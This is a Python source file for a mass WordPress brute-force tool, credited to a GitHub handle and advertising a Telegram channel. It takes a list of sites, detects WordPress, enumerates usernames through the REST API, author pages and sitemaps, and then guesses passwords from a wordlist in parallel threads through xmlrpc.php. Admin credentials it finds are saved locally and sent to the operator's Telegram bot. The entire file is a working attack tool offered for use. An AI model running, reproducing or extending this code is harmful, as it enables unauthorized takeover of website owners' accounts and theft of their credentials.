import requests as req
import os, sys, re, json
from colorama import Fore
from colorama import Style
from colorama import init
init(autoreset=True)
init()
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT

header = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}

def fix_url(url):
	try:
		if 'http' not in str(url):
			url = 'http://'+str(url)
			return url
		else:
			return url
	except:
		pass

def find(regex, string):
	try:
		match = re.findall(regex, string)
		if not match:
			found = ['null']
			return found
		else:
			return match
	except:
		pass

def telegram_client(pesan):
  setting = open('settings.txt', 'r+').read()
  BOT_TOKEN = find('BOT_TOKEN = \"(.*?)\"', setting)[0]
  CHAT_ID = find('CHAT_ID = \"(.*?)\"', setting)[0]
  if "null" in BOT_TOKEN:
    info = print(" Please fill telegram bot token in settings.txt")
    return info
  elif BOT_TOKEN == "":
    info = print(" Please fill telegram bot token in settings.txt")
    return info
  else:
    if "null" in CHAT_ID:
      info = print(" Please fill telegram chat id in settings.txt")
      return info
    elif CHAT_ID == "":
      info = print(" Please fill telegram chat id in settings.txt")
      return info
    else:
      Send = req.get("https://api.telegram.org/bot"+str(BOT_TOKEN)+"/sendMessage?chat_id="+str(CHAT_ID)+"&text="+str(pesan))

def settings(var, pesan):
  setting = open('settings.txt', 'r+').read()
  if var == "TELEGRAM_BOT":
    TELEGRAM_BOT = find('TELEGRAM_BOT = \"(.*?)\"', setting)[0]
    if "ON" in TELEGRAM_BOT:
      return telegram_client(pesan)
    elif "on" in TELEGRAM_BOT:
      return telegram_client(pesan)
    else:
      pass
  elif var == "XMLRPC":
    XMLRPC = find('XMLRPC = \"(.*?)\"', setting)[0]
    if "ON" in XMLRPC:
      info = "ON"
      return info
    elif "on" in XMLRPC:
      info = "ON"
      return info
    else:
      info = "OFF"
      return info
  elif var == "WPLOGIN":
    WPLOGIN = find('WPLOGIN = \"(.*?)\"', setting)[0]
    if "ON" in WPLOGIN:
      info = "ON"
      return info
    elif "on" in WPLOGIN:
      info = "ON"
      return info
    else:
      info = "OFF"
      return info
  elif var == "WORDLIST":
    WORDLIST = find('WORDLIST = \"(.*?)\"', setting)[0]
    if "null" in WORDLIST:
      info = " Please fill wordlist in settings.txt"
      return info
    elif WORDLIST == "":
      info = " Please fill wordlist in settings.txt"
      return info
    else:
      return WORDLIST

def enumerate_user(url):
  user = []
  try:
    response = req.get(fix_url(url)+'/wp-json/wp/v2/users/', headers=header, timeout=5).content
    try:
      for enumerated_user in json.loads(response):
        user.append(enumerated_user['slug'])
    except:
      pass
  except:
    pass
  if not len(user) == 0:
    pass
  else:
    for i in range(10):
      try:
        response = req.get(fix_url(url)+'/?author='+str(i), headers=header, timeout=5)
        find_user = re.findall('/author/(.*?)/', response.content)
        for userdd in find_user:
          user.append(str(userdd))
      except:
        pass
  if not len(user) == 0:
    pass
  else:
    try:
      response = req.get(fix_url+'/author-sitemap.xml', headers=header, timeout=5)
      get_user = re.findall('(<loc>(.*?)</loc>)\\s', response.content)
      for usernn in get_user:
        user.append(str(usernn[1].split('/')[4]))
    except:
      pass
  return user

good = []
bad = []
ban = []

def custom_password(username, password):
  if "[WPLOGIN]" in password:
    pwd = password.replace('[WPLOGIN]', str(username))
    return pwd
  elif not "[WPLOGIN]" in password:
    if "[UPPERLOGIN]" in password:
      pwd1 = str(username.capitalize())
      pwd = password.replace('[UPPERLOGIN]', str(pwd1))
      return pwd
    elif not "[UPPERLOGIN]" in password:
      if "[UPPERALL]" in password:
        pwd1 = str(username.upper())
        pwd = password.replace('[UPPERALL]', str(pwd1))
        return pwd
      else:
        pwds = password
        return pwds

def xmlrpc_save(var, url, username, password):
  try:
    if "isAdmin" in str(var):
      info = "{}//wp-login.php#{}@{}".format(fix_url(url),username,custom_password(str(username), str(password)))
      telegram = "{}//wp-login.php|{}={}".format(fix_url(url),username,custom_password(str(username), str(password)))
      settings('TELEGRAM_BOT', str(telegram))
      open('good.txt','a').write(str(info))
      good.append(url)
      print(fg+sb+" GOOD | URL : "+url+" | USERNAME : "+username+" | PASSWORD : "+custom_password(str(username), str(password)))
    elif "Incorrect username or password" in str(var):
      bad.append(url)
      print(fc+sb+" BAD | URL : "+url+" | USERNAME : "+username+" | PASSWORD : "+custom_password(str(username), str(password)))
    else:
      ban.append(url)
      print(fr+sb+" BAN | URL : "+url+" | USERNAME : "+username+" | PASSWORD : "+custom_password(str(username), str(password)))
  except:
    pass

def xmlrpc(url, username, password):
  try:
    payload = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(username, custom_password(str(username), str(password)))
    headerx = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30', 'Content-Type':'text/xml'}
    response = req.post(fix_url(url)+'/xmlrpc.php', headers=headerx, data=payload, timeout=15)
    xmlrpc_save(response.content, url, username, password)
  except:
    pass

def wp_login(url, username, password):
  try:
    print("WP LOGIN IS NOT AVAILABLE AT NOW WAIT FOR UPDATE & JOIN OUR CHANNEL TELEGRAM : @raid_store")
  except:
    pass

def bruting(url, username, password):
  try:
    XMLRPC = settings('XMLRPC', '')
    WPLOGIN = settings('WPLOGIN', '')
    if ("ON" in XMLRPC and "ON" in WPLOGIN):
      xmlrpc(url, username, password)
      #wp_login(url, username, password)
    else:
      if ("ON" in XMLRPC and "OFF" in WPLOGIN):
        xmlrpc(url, username, password)
      else:
        if ("ON" in WPLOGIN and "OFF" in XMLRPC):
          print("WP LOGIN IS NOT AVAILABLE AT NOW WAIT FOR UPDATE & JOIN OUR CHANNEL TELEGRAM : @raid_store")
          sleep(10)
          #wp_login(url, username, password)
        else:
          print("Please fill XMLRPC or/and WPLOGIN ! ")
          exit()
  except Exception as e:
    print(e)

def brute(url):
  try:
    user_list = enumerate_user(url)
    user = []
    if not len(user_list) == 0:
      for username in user_list:
        open('enumerated-user.txt','a').write(str(username)+'\n')
        user.append(username)
    else:
      user.append("admin")
    
    password = settings('WORDLIST', '')
    for user_url in user:
      with open(password, "r") as password_list:
        for list_password in password_list:
          t = threading.Thread(target=bruting, args=(url,user_url,list_password))
          t.start()


      user.clear()
  except Exception as e:
    print(e)

def detect_wordpress(url):
  try:
    wordpress = req.get(fix_url(url)+'/wp-includes/js/jquery/jquery-migrate.min.js', headers=header, timeout=3)
    wordpress1 = req.get(fix_url(url)+'/wp-includes/ID3/license.txt', headers=header, timeout=3)
    wordpress2 = req.get(fix_url(url), headers=header, timeout=3)
    wordpress3 = req.get(fix_url(url)+'/wp-login.php', headers=header, timeout=3)
    try:
      if 'getID3() by James Heinrich <info@getid3.org>' in wordpress1.text:
        print("{}{} Detected Wordpress | URL : {}".format(fg,sb,fix_url(url)))
        open('wordpress.txt','a').write(str(fix_url(url))+'\n')
        brute(url)
      else:
        if '/*! jQuery Migrate' in wordpress.text:
          print("{}{} Detected Wordpress | URL : {}".format(fg,sb,fix_url(url)))
          open('wordpress.txt','a').write(str(fix_url(url))+'\n')
          brute(url)
        else:
          if '/wp-content/' in wordpress2.text:
            print("{}{} Detected Wordpress | URL : {}".format(fg,sb,fix_url(url)))
            open('wordpress.txt','a').write(str(fix_url(url))+'\n')
            brute(url)
          else:
            if 'Powered by WordPress' in wordpress3.text:
              print("{}{} Detected Wordpress | URL : {}".format(fg,sb,fix_url(url)))
              open('wordpress.txt','a').write(str(fix_url(url))+'\n')
              brute(url)
            else:
              if 'Username or Email Address' in wordpress3.text:
                print("{}{} Detected Wordpress | URL : {}".format(fg,sb,fix_url(url)))
                open('wordpress.txt','a').write(str(fix_url(url))+'\n')
                brute(url)
              else:
                if 'Password' in wordpress3.text:
                  print("{}{} Detected Wordpress | URL : {}".format(fg,sb,fix_url(url)))
                  open('wordpress.txt','a').write(str(fix_url(url))+'\n')
                  brute(url)
                else:
                  if ('www.cloudflare.com' in wordpress3.text or 'https://www.cloudflare.com/' in wordpress3.text or 'Cloudflare' in wordpress3.text):
                    print("{}{} Detected Wordpress | URL : {}".format(fc,sb,fix_url(url)))
                  else:
                    print("{}{} Not Wordpress | URL : {}".format(fr,sb,fix_url(url)))
                    
    except:
      pass
  except:
    pass

def main():
  WORDLIST = settings('WORDLIST', '')
  if "Please" in WORDLIST:
    print(WORDLIST)
    sleep(10)
    exit()
  else:
    pass
  raid = """\n\n{}{}
  
®®®®®®®®      ®®®®®®®®   ®®®®®®®®®®®®®®®®®®®®®®®
®®®®®®®®     ®®®®®®®®    ®®®®®®®®®®®®®®®®®®®®®®®
®®®®®®®®    ®®®®®®®®     ®®®®®®®®®®®®®®®®®®®®®®®
®®®®®®®®   ®®®®®®®®                     ®®®®®®®®
®®®®®®®®  ®®®®®®®®                      ®®®®®®®®
®®®®®®®® ®®®®®®®®                       ®®®®®®®®
®®®®®®®® ®®®®®®®®                       ®®®®®®®®
®®®®®®®® ®®®®®®®®                       ®®®®®®®®
®®®®®®®®  ®®®®®®®®                      ®®®®®®®®
®®®®®®®®   ®®®®®®®®                     ®®®®®®®®
®®®®®®®®    ®®®®®®®®                    ®®®®®®®® 
®®®®®®®®     ®®®®®®®®                   ®®®®®®®®

 """.format(fg,sb)
  print(raid)
  print(fg+sb+"\t WPBF Wordpress. ")
  print(fg+sb+"\t > Brute Force XMLRPC. ")
  print(fg+sb+"\t > Version : 1.0 [ BETA ] ")
  print(fg+sb+"\t Github : @koleksibot")
  print(fg+sb+"\t Join My Github : ")
  print(fg+sb+"\t [ ! ] NOTE : Jangan Di Jual Ini Tools GRATISSSSS. ")
  filename = input(fg+sb+"\n\t [ A ] Masukan list mu (Ex: list.txt) : ")
  xxx = []
  with open(filename) as list:
    for line in list.readlines():
      if len(line) > 3:
        xxx.append(line.strip())
  try:
    delay = 0
    for boost in xxx:
      delay += 1
      if delay == 100:
        sleep(15)
        delay = 0
        continue
      else:
        pass
      t = threading.Thread(target=detect_wordpress, args=(boost,))
      t.start()
  except Exception as e:
    print(e)

main()
